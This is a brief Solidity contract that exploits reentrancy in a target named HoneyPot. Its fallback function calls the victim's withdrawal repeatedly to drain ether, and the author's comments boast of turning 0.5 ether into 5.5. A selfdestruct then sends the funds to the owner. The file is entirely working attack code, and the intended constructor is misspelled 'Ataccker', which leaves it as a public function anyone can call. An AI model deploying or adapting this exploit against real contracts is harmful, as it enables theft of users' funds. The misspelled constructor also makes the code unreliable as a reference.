pragma solidity 0.4.19;

contract Attacker {
    HoneyPot victim;
    uint public count;
    address owner;
    
    event logger(uint count, uint balance);
    
    function Ataccker(address _victim) payable public {
        victim = HoneyPot(_victim);
        victim.put.value(msg.value)(); // i put 0.5 ether
        owner = msg.sender;
    } 

    function attack() public {
        victim.get();
    }
    
    function () payable public {
        count++;
        logger(count, this.balance);
        if (count < 11) victim.get(); // i get 5.5 ether i need my 0.5 ether back :D
    }
    
    function dead() public {
        selfdestruct(owner);
    }
}
